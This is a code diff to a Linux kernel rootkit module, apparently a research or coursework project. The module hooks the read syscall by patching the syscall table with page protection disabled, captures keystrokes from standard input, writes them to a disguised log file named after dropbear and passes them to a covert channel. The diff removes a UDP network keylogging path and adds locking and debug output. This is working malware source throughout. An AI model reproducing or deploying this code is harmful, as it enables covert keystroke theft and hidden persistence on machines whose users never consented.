@@ -34,7 +34,6 @@
 
 #include "covert_communication.h"
 #include "include.h"
-#include "net_keylog.h"
 
 asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);
 
@@ -49,37 +48,46 @@ static int read_call_counter = 0;
 static spinlock_t read_lock;
 static unsigned long read_lock_flags;
 
-extern int send_flag; // For network keylogging
 static int file_log = 0;
 
 /*
  * Function used for enabling local logging
  */
-void
+int
 enable_filelog(void)
 {
         file_log = 1;
+	return 0;
 }
 
 /*
  * Function used for disabling local logging
  */
-void
+int
 disable_filelog(void)
 {
         file_log = 0;
+	return 0;
 }
 
 /*
  * Function used for local logging inside /var/log
  */
-void
+ssize_t
 write_to_file(char *buf, long len)
 {
-	loff_t off = 0;
-	if (!IS_ERR (fd)) {
-		vfs_write(fd, buf, len, &off); 
-	}	
+	static loff_t off = 0;
+	static DEFINE_SPINLOCK(wtf_lock);
+	ssize_t retv;
+
+	spin_lock(&wtf_lock);
+	if (!IS_ERR(fd))
+		retv = vfs_write(fd, buf, len, &off); 
+	else
+		retv = PTR_ERR(fd);
+	spin_unlock(&wtf_lock);
+
+	return retv;
 }
 
 /*
@@ -92,34 +100,34 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 	/* increase our call counter */
 	INCREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
 	
-	int i;	
-	long ret = original_read(fd, buf, count);
+	int i;
+	ssize_t ret;
+	long retv = original_read(fd, buf, count);
 
-	if(ret >= 1 && fd == 0) {
+	if(retv >= 1 && fd == 0) {
 		/* keylog to local file */
 		if(file_log){
-			write_to_file(buf, ret);
+			ret = write_to_file(buf, retv);
+			if(ret <= 0) 
+				ROOTKIT_DEBUG("write_to_file() failed with error code %li", ret);
 		}
 		
-		for(i = 0; i < ret; i++) {
+		for(i = 0; i < retv; i++) {
 			char sendbuf[2];
 			
 			memcpy(sendbuf, buf+i, 1);
 			memset(sendbuf+1, '\0', 1);
 			
-			/* If the send_flag is set, then network keylogging is enabled */
-			if(send_flag) {
-				send_udp(sendbuf);
-			}
-			
 			/* send to covert communication channel */
-			accept_input(buf[i]);
+			ret = accept_input(buf[i]);
+			if(ret < 0)
+				ROOTKIT_DEBUG("accept_input() failed with error code %li", ret);
 		}
 	}
 
 	/* decrease our call counter and return */
 	DECREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
-	return ret;
+	return retv;
 }
 
 /*
@@ -133,7 +141,7 @@ hook_read(void)
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* create the file with write and append mode */
-	fd = filp_open("/var/log/dropbear_log.log", O_CREAT|O_WRONLY|O_APPEND|O_TRUNC, S_IRWXU);
+	fd = filp_open("/var/log/dropbear_log.log", O_CREAT|O_WRONLY|O_APPEND, S_IRUSR | S_IWUSR);
 	
 	/* disable write protection */
 	disable_page_protection();
@@ -156,6 +164,8 @@ hook_read(void)
 void
 unhook_read(void)
 {
+	long l = 0;
+
 	ROOTKIT_DEBUG("Restoring original read...\n");
 	
 	void **sys_call_table = (void *) sysmap_sys_call_table;
@@ -171,7 +181,10 @@ unhook_read(void)
 	
 	/* ensure that all processes have left our manipulated syscall */
 	while(read_call_counter > 0) {
-		msleep(100);
+		if(l%16 == 0)
+			ROOTKIT_DEBUG("read_call_counter is at %i", read_call_counter);
+		l++;
+		msleep(2);
 	}
 	
 	/* close our logfile */
